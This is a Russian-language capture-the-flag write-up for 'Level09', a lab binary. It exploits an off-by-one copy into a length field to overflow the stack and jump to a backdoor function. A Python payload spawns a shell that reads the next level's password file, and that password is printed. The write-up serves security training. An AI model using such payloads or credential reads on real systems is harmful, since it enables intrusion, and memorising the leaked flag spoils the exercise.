## Level09

Мы замечаем, что функция `set_username` копирует на один байт больше, чем есть место в буфере `msg->usr`, из-за использования нестрогого сравнения в критерии останова петли `for`.

Мы можем перезаписать верхний байт значения `msg->len`, который следует за буфером. Это открывает возможность для `buffer-overflow` атак при последующем вызове 
```cpp
strncpy(msg->text, buf, msg->len);
```

Наша цель -- перенаправить контроль к функции `secret_backdoor`. Нас может спутить то, что программа была скомпилирована с флагом PIE, как показывает утилита `checksec`
```sh
$ checksec --file /home/users/level09/level09
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```

Обычно это означало бы, что нам необходимо найти base-address offset, который бы отличался между  запусками программы. Однако нам повезло, что на нашей машине глобально выключен ASLR, из-за чего адреса памяти остаются всегда одинаковы, несмотря на PIE:
```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

C помощью [Binary Ninja](https://cloud.binary.ninja) мы находим, что структура `msg` находится по адресу `$rbp - 0xc0`. Прибавляя восемь байт для сохраненного на стеке значения `$rsp`, мы получаем, что растрояние между началом буфера `msg->text` и записанным значением `$rip` равно

```
0xc0 + 8 = 200 
```

Наконец, согласно gdb адрес функции `secret_backdoor` после выгрузки программы равен `0x000055555555488c`

Итого,
```sh
$ (python -c "print 'a'*40 + '\xff' + '\n' + 'a'*200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n' + '/bin/sh'"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa?>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```




